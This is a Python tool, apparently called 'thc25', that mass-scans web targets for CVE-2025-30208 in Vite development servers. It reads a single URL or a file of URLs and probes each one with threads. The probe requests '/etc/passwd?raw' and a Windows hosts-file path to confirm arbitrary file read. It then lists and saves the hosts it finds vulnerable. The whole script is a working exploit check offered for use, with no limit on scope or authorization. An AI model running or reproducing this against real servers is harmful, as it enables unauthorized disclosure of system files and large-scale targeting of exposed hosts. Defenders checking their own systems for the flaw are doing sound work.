import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from rich.console import Console
from rich.prompt import Prompt, Confirm
from rich.table import Table
import os

console = Console()

def normalize_url(url):
    url = url.strip().replace('\r', '').replace('\n', '')
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    return url

def safe_request(url, headers, timeout=5):
    try:
        response = requests.get(url, headers=headers, timeout=timeout, allow_redirects=True)
        return response
    except requests.RequestException:
        if url.startswith('http://'):
            https_url = 'https://' + url[len('http://'):]
            try:
                response = requests.get(https_url, headers=headers, timeout=timeout, allow_redirects=True)
                return response
            except:
                return None
        return None

def is_vulnerable(url):
    headers = {"User-Agent": "Mozilla/5.0"}
    try:
        resp1 = safe_request(url, headers)
        if not resp1 or "vite" not in resp1.text.lower():
            return None

        test_paths = [
            "/etc/passwd?raw",
            "/C:/Windows/System32/drivers/etc/hosts?raw"
        ]

        for path in test_paths:
            test_url = url.rstrip("/") + path
            resp2 = safe_request(test_url, headers)
            if resp2 and resp2.status_code == 200:
                if "root:" in resp2.text or "Microsoft Corp" in resp2.text:
                    return url
        return None
    except:
        return None

def scan_targets(targets, max_threads):
    results = []
    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        future_to_url = {executor.submit(is_vulnerable, url): url for url in targets}
        for future in as_completed(future_to_url):
            url = future_to_url[future]
            try:
                result = future.result()
                if result:
                    console.print(f"[green][+] Vulnerable: {result}[/green]")
                    results.append(result)
                else:
                    console.print(f"[red][-] Not Vulnerable: {url}[/red]")
            except Exception as exc:
                console.print(f"[yellow][!] Error scanning {url}: {exc}[/yellow]")
    return results

def main():
    console.rule("")
    os.system('cls' if os.name == 'nt' else 'clear')
    console.print("[bold green]Welcome to thc25 tool - CVE-2025-30208 Scanner[/bold green]\n")

    mode = Prompt.ask("Choose scan mode", choices=["single", "mass"], default="single")
    targets = []

    if mode == "single":
        url = Prompt.ask("Enter target URL (e.g., http://example.com or example.com:3000)")
        targets = [normalize_url(url)]
    else:
        file_path = Prompt.ask("Enter path to file with target URLs")
        if not os.path.exists(file_path):
            console.print(f"[red]File not found: {file_path}[/red]")
            return
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            targets = [normalize_url(line) for line in f if line.strip()]

    try:
        max_threads = int(Prompt.ask("Enter number of threads", default="10"))
    except ValueError:
        console.print("[red]Invalid number of threads[/red]")
        return

    console.print(f"\n[cyan]Scanning {len(targets)} target(s) with {max_threads} threads...[/cyan]\n")
    results = scan_targets(targets, max_threads)

    console.rule("[bold yellow]Scan Results[/bold yellow]")
    if results:
        table = Table(title="Vulnerable Targets")
        table.add_column("No.", justify="center", style="cyan")
        table.add_column("URL", style="green")

        for i, url in enumerate(results, 1):
            table.add_row(str(i), url)
        console.print(table)

        if Confirm.ask("Do you want to save the results?", default=True):
            filename = Prompt.ask("Enter filename to save", default="vuln_results.txt")
            with open(filename, "w") as f:
                for url in results:
                    f.write(url + "\n")
            console.print(f"[green]Results saved to {filename}[/green]")
    else:
        console.print("[bold red]No vulnerable targets found.[/bold red]")

if __name__ == "__main__":
    main()